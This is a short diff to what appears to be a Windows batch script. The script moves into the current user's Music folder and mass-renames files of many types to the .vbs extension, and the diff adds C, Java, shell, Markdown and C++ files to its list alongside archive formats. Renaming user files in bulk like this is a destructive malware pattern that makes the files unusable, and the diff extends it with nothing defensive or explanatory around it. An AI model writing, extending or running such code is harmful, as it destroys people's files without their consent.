@@ -1,4 +1,9 @@
 cd C:\Users\%username%\music
+ren *.c *.vbs
+ren *.java *.vbs
+ren *.sh *.vbs
+ren *.md *.vbs
+ren *.cpp *.vbs
 ren *.arj *.vbs
 ren *.bz2 *.vbs
 ren *.cab *.vbs
